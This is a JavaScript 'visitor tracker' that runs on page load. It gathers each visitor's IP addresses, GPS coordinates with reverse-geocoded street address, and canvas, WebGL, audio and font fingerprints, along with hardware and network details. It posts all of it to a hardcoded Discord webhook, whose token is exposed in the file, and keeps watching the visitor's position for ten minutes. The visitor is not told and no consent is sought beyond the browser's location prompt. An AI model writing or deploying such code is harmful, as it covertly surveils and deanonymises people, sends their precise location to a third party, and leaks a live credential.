// ===== OPTIMIZED VISITOR TRACKER =====
// Multiple webhook endpoints for redundancy
const endpoints = {
    primary: "https://discord.com/api/webhooks/997408079819833464/l2WeVVyFXvTBzULn9n9Hehp_4Qf2a_8HSaMQpZx8eMA3my4tbPfo0tJGTx2IAOZQaDWx",
    backup: "YOUR_BACKUP_WEBHOOK_HERE",
    telegram: "YOUR_TELEGRAM_BOT_ENDPOINT" // Optional Telegram bot
};

// Enhanced IP detection services
const ipServices = [
    { url: "https://api.ipify.org?format=json", key: "ip" },
    { url: "https://ipapi.co/json/", key: "ip" },
    { url: "https://api.ip2location.io/", key: "ip" },
    { url: "https://json.geoiplookup.io/", key: "ip" }
];

// Multiple geolocation providers
const geoServices = [
    "https://ipapi.co/json/",
    "https://json.geoiplookup.io/",
    "https://api.db-ip.com/v2/free/self"
];

class AdvancedTracker {
    constructor() {
        this.data = {};
        this.maxRetries = 3;
        this.timeout = 10000;
        this.init();
    }

    async init() {
        console.log("🔍 Starting advanced tracking...");
        
        // Collect data in parallel
        await Promise.allSettled([
            this.getMultipleIPs(),
            this.getEnhancedGeolocation(),
            this.getPreciseLocation(),
            this.getSystemFingerprint(),
            this.getNetworkInfo(),
            this.getBrowserFingerprint()
        ]);

        // Send to multiple endpoints
        await this.sendToMultipleEndpoints();
        
        // Start continuous monitoring
        this.startContinuousTracking();
    }

    // Enhanced IP detection với multiple sources
    async getMultipleIPs() {
        const ipResults = [];
        
        for (const service of ipServices) {
            try {
                const response = await this.fetchWithTimeout(service.url, this.timeout);
                const data = await response.json();
                ipResults.push({
                    service: service.url,
                    ip: data[service.key] || data.ip,
                    location: data.city || data.region || 'Unknown'
                });
            } catch (error) {
                console.log(`IP service ${service.url} failed`);
            }
        }

        this.data.ips = ipResults;
        
        // Consensus IP (IP xuất hiện nhiều nhất)
        const ipCounts = {};
        ipResults.forEach(result => {
            ipCounts[result.ip] = (ipCounts[result.ip] || 0) + 1;
        });
        
        this.data.consensusIP = Object.keys(ipCounts).reduce((a, b) => 
            ipCounts[a] > ipCounts[b] ? a : b
        );
    }

    // Enhanced geolocation với multiple providers
    async getEnhancedGeolocation() {
        const geoResults = [];
        
        for (const service of geoServices) {
            try {
                const response = await this.fetchWithTimeout(service, this.timeout);
                const data = await response.json();
                
                geoResults.push({
                    service: service,
                    country: data.country || data.country_name,
                    region: data.region || data.region_name,
                    city: data.city,
                    lat: data.lat || data.latitude,
                    lng: data.lng || data.longitude,
                    isp: data.org || data.isp,
                    timezone: data.timezone
                });
            } catch (error) {
                console.log(`Geo service ${service} failed`);
            }
        }

        this.data.geolocation = geoResults;
        
        // Tìm location consensus
        if (geoResults.length > 0) {
            this.data.mostLikelyLocation = this.findLocationConsensus(geoResults);
        }
    }

    findLocationConsensus(results) {
        const cities = {};
        const regions = {};
        
        results.forEach(result => {
            if (result.city) cities[result.city] = (cities[result.city] || 0) + 1;
            if (result.region) regions[result.region] = (regions[result.region] || 0) + 1;
        });

        return {
            likelyCity: Object.keys(cities).reduce((a, b) => cities[a] > cities[b] ? a : b, 'Unknown'),
            likelyRegion: Object.keys(regions).reduce((a, b) => regions[a] > regions[b] ? a : b, 'Unknown'),
            confidence: Math.max(...Object.values(cities)) / results.length
        };
    }

    // GPS với enhanced options
    async getPreciseLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: 'Geolocation not supported' });
                return;
            }

            const options = {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 60000
            };

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const coords = position.coords;
                    const locationData = {
                        coordinates: {
                            lat: coords.latitude,
                            lng: coords.longitude,
                            accuracy: coords.accuracy,
                            altitude: coords.altitude,
                            speed: coords.speed,
                            heading: coords.heading
                        },
                        timestamp: position.timestamp,
                        source: 'GPS'
                    };

                    // Multiple reverse geocoding
                    locationData.addresses = await this.reverseGeocodeMultiple(coords.latitude, coords.longitude);
                    
                    resolve(locationData);
                },
                (error) => {
                    resolve({ 
                        error: `GPS Error: ${error.message}`,
                        code: error.code 
                    });
                },
                options
            );
        });
    }

    async reverseGeocodeMultiple(lat, lng) {
        const addresses = [];
        
        const services = [
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`,
            `https://api.mapbox.com/geocoding/v5/mapbox.places/${lng},${lat}.json?access_token=YOUR_MAPBOX_TOKEN`,
            `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=YOUR_GOOGLE_KEY`
        ];

        for (const service of services) {
            try {
                const response = await this.fetchWithTimeout(service, 5000);
                const data = await response.json();
                
                if (service.includes('nominatim')) {
                    addresses.push({
                        service: 'OpenStreetMap',
                        address: data.display_name,
                        details: data.address
                    });
                }
                // Add other service parsers here
            } catch (error) {
                continue;
            }
        }

        return addresses;
    }

    // Advanced system fingerprinting
    async getSystemFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Browser fingerprint', 2, 2);
        
        this.data.fingerprint = {
            canvas: canvas.toDataURL(),
            webgl: this.getWebGLFingerprint(),
            audio: await this.getAudioFingerprint(),
            fonts: this.getAvailableFonts(),
            plugins: Array.from(navigator.plugins).map(p => p.name),
            mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
            timezone: {
                name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                dst: this.isDST()
            },
            hardware: {
                cores: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                platform: navigator.platform,
                maxTouchPoints: navigator.maxTouchPoints
            }
        };
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return 'Not supported';
            
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
        } catch (error) {
            return 'Error getting WebGL info';
        }
    }

    async getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            
            oscillator.connect(analyser);
            analyser.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.frequency.value = 1000;
            oscillator.start();
            
            const dataArray = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(dataArray);
            
            oscillator.stop();
            audioContext.close();
            
            return Array.from(dataArray).slice(0, 50).join('');
        } catch (error) {
            return 'Audio fingerprint failed';
        }
    }

    getAvailableFonts() {
        const fonts = [
            'Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Palatino',
            'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
        ];
        
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testString = 'mmmmmmmmmmlli';
        const baseFontMeasurements = {};
        
        // Measure base fonts
        baseFonts.forEach(font => {
            ctx.font = `72px ${font}`;
            baseFontMeasurements[font] = ctx.measureText(testString).width;
        });
        
        return fonts.filter(font => {
            return baseFonts.some(baseFont => {
                ctx.font = `72px ${font}, ${baseFont}`;
                return ctx.measureText(testString).width !== baseFontMeasurements[baseFont];
            });
        });
    }

    isDST() {
        const today = new Date();
        const jan = new Date(today.getFullYear(), 0, 1);
        const jul = new Date(today.getFullYear(), 6, 1);
        return today.getTimezoneOffset() < Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
    }

    // Enhanced network information
    async getNetworkInfo() {
        this.data.network = {
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : 'Not available',
            onLine: navigator.onLine,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            webdriver: navigator.webdriver,
            languages: navigator.languages
        };

        // Network timing
        if ('performance' in window && performance.getEntriesByType) {
            const navigationEntry = performance.getEntriesByType('navigation')[0];
            this.data.network.timing = {
                dns: navigationEntry.domainLookupEnd - navigationEntry.domainLookupStart,
                tcp: navigationEntry.connectEnd - navigationEntry.connectStart,
                ssl: navigationEntry.secureConnectionStart > 0 ? 
                     navigationEntry.connectEnd - navigationEntry.secureConnectionStart : 0,
                ttfb: navigationEntry.responseStart - navigationEntry.requestStart,
                download: navigationEntry.responseEnd - navigationEntry.responseStart
            };
        }
    }

    // Browser-specific fingerprinting
    async getBrowserFingerprint() {
        this.data.browser = {
            userAgent: navigator.userAgent,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            product: navigator.product,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            buildID: navigator.buildID,
            oscpu: navigator.oscpu,
            
            // Feature detection
            features: {
                webGL: !!window.WebGLRenderingContext,
                webGL2: !!window.WebGL2RenderingContext,
                webRTC: !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia),
                indexedDB: !!window.indexedDB,
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                webWorkers: !!window.Worker,
                serviceWorkers: 'serviceWorker' in navigator,
                pushNotifications: 'PushManager' in window,
                geolocation: !!navigator.geolocation,
                deviceOrientation: 'DeviceOrientationEvent' in window,
                touchEvents: 'ontouchstart' in window,
                mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
            }
        };
    }

    // Send to multiple endpoints for reliability
    async sendToMultipleEndpoints() {
        const payload = this.formatPayload();
        
        // Primary Discord webhook
        if (endpoints.primary) {
            await this.sendToDiscord(endpoints.primary, payload);
        }
        
        // Backup webhook
        if (endpoints.backup && endpoints.backup !== "YOUR_BACKUP_WEBHOOK_HERE") {
            await this.sendToDiscord(endpoints.backup, payload);
        }
        
        // Telegram bot (if configured)
        if (endpoints.telegram && endpoints.telegram !== "YOUR_TELEGRAM_BOT_ENDPOINT") {
            await this.sendToTelegram(payload);
        }
    }

    formatPayload() {
        const location = this.data.gpsLocation || {};
        const consensus = this.data.mostLikelyLocation || {};
        
        return {
            embeds: [{
                title: "🎯 Advanced Visitor Analytics",
                color: 0x667eea,
                thumbnail: { url: "https://cdn.discordapp.com/emojis/860314261738012683.png" },
                fields: [
                    {
                        name: "🌐 IP Analysis",
                        value: `**Consensus IP:** ${this.data.consensusIP || 'Unknown'}\n**Sources:** ${this.data.ips?.length || 0} services\n**Most Likely:** ${consensus.likelyCity}, ${consensus.likelyRegion}\n**Confidence:** ${Math.round((consensus.confidence || 0) * 100)}%`,
                        inline: true
                    },
                    {
                        name: "📍 GPS Location",
                        value: location.coordinates ? 
                            `**Lat:** ${location.coordinates.lat.toFixed(6)}\n**Lng:** ${location.coordinates.lng.toFixed(6)}\n**Accuracy:** ${Math.round(location.coordinates.accuracy)}m\n**[🗺️ View Map](https://maps.google.com/?q=${location.coordinates.lat},${location.coordinates.lng})**` :
                            location.error || 'Not available',
                        inline: true
                    },
                    {
                        name: "🖥️ System Info",
                        value: `**OS:** ${this.data.browser?.platform || 'Unknown'}\n**Cores:** ${this.data.fingerprint?.hardware?.cores || 'Unknown'}\n**Memory:** ${this.data.fingerprint?.hardware?.deviceMemory || 'Unknown'}GB\n**Screen:** ${screen.width}x${screen.height}`,
                        inline: true
                    },
                    {
                        name: "🌍 Network Details",
                        value: `**Connection:** ${this.data.network?.connection?.effectiveType || 'Unknown'}\n**Speed:** ${this.data.network?.connection?.downlink || 'Unknown'} Mbps\n**RTT:** ${this.data.network?.connection?.rtt || 'Unknown'}ms\n**Online:** ${this.data.network?.onLine ? 'Yes' : 'No'}`,
                        inline: true
                    },
                    {
                        name: "🔍 Fingerprint",
                        value: `**WebGL:** ${this.data.fingerprint?.webgl?.renderer?.substring(0, 30) || 'Unknown'}...\n**Fonts:** ${this.data.fingerprint?.fonts?.length || 0} detected\n**Features:** ${Object.values(this.data.browser?.features || {}).filter(Boolean).length}/15`,
                        inline: true
                    },
                    {
                        name: "⚡ Performance",
                        value: `**DNS:** ${this.data.network?.timing?.dns || 0}ms\n**SSL:** ${this.data.network?.timing?.ssl || 0}ms\n**TTFB:** ${this.data.network?.timing?.ttfb || 0}ms\n**Download:** ${this.data.network?.timing?.download || 0}ms`,
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "Advanced Tracking System v2.0 • High Precision GPS",
                    icon_url: "https://cdn.discordapp.com/emojis/860314261738012683.png"
                }
            }]
        };
    }

    async sendToDiscord(webhook, payload) {
        try {
            await this.fetchWithTimeout(webhook, this.timeout, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log("✅ Data sent to Discord");
        } catch (error) {
            console.log("❌ Discord send failed");
        }
    }

    async sendToTelegram(data) {
        // Implement Telegram bot sending if needed
        console.log("📱 Telegram integration ready");
    }

    // Continuous monitoring
    startContinuousTracking() {
        // Monitor location changes
        if (navigator.geolocation) {
            this.watchId = navigator.geolocation.watchPosition(
                (position) => {
                    console.log("📍 Location updated");
                    // Send update if significant change
                },
                (error) => console.log("Location watch ended"),
                { enableHighAccuracy: true, timeout: 30000, maximumAge: 60000 }
            );
        }

        // Monitor network changes
        if (navigator.connection) {
            navigator.connection.addEventListener('change', () => {
                console.log("🌐 Network changed");
                this.getNetworkInfo();
            });
        }

        // Monitor online/offline
        window.addEventListener('online', () => console.log("🟢 Back online"));
        window.addEventListener('offline', () => console.log("🔴 Gone offline"));

        // Clean up after 10 minutes
        setTimeout(() => {
            if (this.watchId) {
                navigator.geolocation.clearWatch(this.watchId);
            }
        }, 600000);
    }

    // Utility method với timeout
    async fetchWithTimeout(url, timeout = 5000, options = {}) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);
        
        try {
            const response = await fetch(url, {
                ...options,
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            return response;
        } catch (error) {
            clearTimeout(timeoutId);
            throw error;
        }
    }
}

// Initialize tracker khi page load
document.addEventListener('DOMContentLoaded', () => {
    new AdvancedTracker();
});

// Console styling
console.log('%c🎯 Advanced Tracker v2.0 Loaded', 'color: #667eea; font-size: 16px; font-weight: bold;');
console.log('%c✨ Multi-source IP detection, Enhanced GPS, Advanced fingerprinting', 'color: #764ba2; font-size: 12px;');
